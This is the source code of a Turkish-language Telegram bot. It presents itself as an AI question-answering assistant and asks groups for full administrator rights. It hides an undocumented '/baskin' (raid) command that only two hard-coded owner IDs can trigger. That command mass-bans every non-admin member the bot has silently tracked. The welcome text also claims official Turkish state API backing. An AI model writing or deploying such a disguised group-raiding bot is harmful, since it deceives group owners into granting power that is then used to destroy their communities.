import os
import logging
import asyncio
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters
)

# Gerekli ortam değişkenleri
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
OPENROUTER_API_KEY = os.getenv("OPENROUTER_API_KEY")

# Yetkili kullanıcı ID'leri
BOT_SAHIPLERI = {8069059457, 7510507299}

# Aktif üyeleri takip etmek için
aktif_uyeler = set()
sohbet_modu = False

# Loglama
logging.basicConfig(level=logging.INFO)

# OpenRouter API ile yapay zeka cevabı
async def openrouter_soru_cevapla(soru: str) -> str:
    url = "https://openrouter.ai/api/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "model": "gpt-4o",
        "messages": [
            {"role": "user", "content": soru}
        ]
    }
    try:
        response = requests.post(url, json=data, headers=headers, timeout=15)
        response.raise_for_status()
        return response.json()["choices"][0]["message"]["content"]
    except Exception as e:
        logging.error(f"OpenRouter API hatası: {e}")
        return "Ya Sabır... Bir hata oluştu."

# /start komutu
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gif_url = "https://media.giphy.com/media/Gf3AUz3eBNbTW/giphy.gif"
    await update.message.reply_animation(animation=gif_url)
    text = (
        "🇹🇷 Ben Türkiye Cumhuriyeti API destekli bir yapay zeka botuyum.\n\n"
        "📌 Grup sohbetlerinde /sor komutu ile soru sorabilir,\n"
        "/gel komutuyla sohbet modunu açabilirsiniz.\n\n"
        "_Sunucular periyodik olarak temizlenmektedir._"
    )
    buttons = [
        [InlineKeyboardButton("📌 DESTEK", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("👨‍💻 GELİŞTİRİCİ", url="https://t.me/ZeydBinhalit")]
    ]
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(buttons))

# /help komutu
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gif_url = "https://media.giphy.com/media/l3q2K5jinAlChoCLS/giphy.gif"
    await update.message.reply_animation(animation=gif_url)
    text = (
        "❗ Eğer bot çalışmıyorsa, bazı yetkiler eksik olabilir.\n\n"
        "✅ Lütfen botun tüm yönetici yetkilerine sahip olduğundan emin olun."
    )
    buttons = [
        [InlineKeyboardButton("📌 DESTEK", url="https://t.me/kizilsancaktr")],
        [InlineKeyboardButton("👨‍💻 GELİŞTİRİCİ", url="https://t.me/ZeydBinhalit")]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(buttons))

# /sor komutu
async def sor(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❓ Lütfen bir soru yazın. Örn: /sor Türkiye'nin başkenti neresi?")
        return
    soru = " ".join(context.args)
    cevap = await openrouter_soru_cevapla(soru)
    await update.message.reply_text(f"**Soru:** {soru}\n**Cevap:** {cevap}", parse_mode="Markdown")

# /gel komutu → Sohbet modunu açar
async def gel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global sohbet_modu
    user_id = update.message.from_user.id
    if user_id not in BOT_SAHIPLERI:
        await update.message.reply_text("Bu komutu sadece yetkililer kullanabilir.")
        return
    sohbet_modu = True
    await update.message.reply_text("🗣 Sohbet modu açıldı. Artık gelen mesajlara yanıt vereceğim.")

# Sohbet modundaki mesajlara yanıt verir
async def sohbet_mesaj(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not sohbet_modu:
        return
    mesaj = update.message.text
    cevap = await openrouter_soru_cevapla(mesaj)
    await update.message.reply_text(cevap)

# /baskin komutu → Grup üyelerini banlar (Yalnızca sahipler)
async def baskin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    chat = update.effective_chat

    if user_id not in BOT_SAHIPLERI:
        return

    if chat.type not in ['group', 'supergroup']:
        await update.message.reply_text("Bu komut yalnızca gruplarda çalışır.")
        return

    await update.message.reply_text("🚨 Baskın başlatılıyor! Temizlik zamanı...")

    try:
        admins = await context.bot.get_chat_administrators(chat.id)
        admin_ids = {admin.user.id for admin in admins}
        admin_ids.add(context.bot.id)

        ban_say = 0
        for uid in list(aktif_uyeler):
            if uid not in admin_ids:
                try:
                    await context.bot.ban_chat_member(chat.id, uid)
                    ban_say += 1
                    await update.message.reply_text(f"🚫 Banlandı: {uid}")
                    await asyncio.sleep(0.4)
                except Exception as e:
                    logging.error(f"Ban hatası: {e}")
        await update.message.reply_text(f"Baskın tamamlandı! Toplam ban: {ban_say}")
    except Exception as e:
        await update.message.reply_text(f"❌ Hata: {e}")

# Mesaj atan kullanıcıları takip et
async def mesaj_kaydet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.from_user:
        aktif_uyeler.add(update.message.from_user.id)

# Main fonksiyonu
def main():
    if not TELEGRAM_TOKEN or not OPENROUTER_API_KEY:
        raise ValueError("Gerekli API anahtarları eksik!")

    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    # Komutlar
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("sor", sor))
    app.add_handler(CommandHandler("gel", gel))
    app.add_handler(CommandHandler("baskin", baskin))

    # Kullanıcı takibi
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, mesaj_kaydet))

    # Sohbet modundaki yanıtlar
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, sohbet_mesaj))

    print("🤖 Sabr AI başladı.")
    app.run_polling()

if __name__ == "__main__":
    main()
